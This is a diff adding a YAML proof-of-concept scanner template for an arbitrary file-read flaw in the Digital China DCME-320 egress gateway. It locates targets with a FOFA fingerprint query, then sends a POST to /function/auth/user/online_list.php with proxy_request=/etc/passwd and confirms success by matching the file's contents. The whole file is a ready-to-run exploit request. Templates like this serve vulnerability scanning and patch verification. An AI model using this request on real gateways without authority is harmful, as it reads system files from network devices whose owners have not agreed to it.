@@ -1,0 +1,21 @@
+id: poc-yaml-digitalchina-dcme-320-eg-online-list-php-anyfile-read
+info:
+  name: 神州数码 DCME-320出口网关 online_list.php 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 神州数码 DCME-320出口网关
+  fofa: body="style/blue/css/dcn_ui.css"
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(body,"style/blue/css/dcn_ui.css")
+- method: POST
+  path: /function/auth/user/online_list.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: proxy_request=/etc/passwd
+  expression: status_code == 200 && contains(body,"root") && contains(body,"/bin")
+    && !contains(body,"<")
+variables: {}
+transport: http
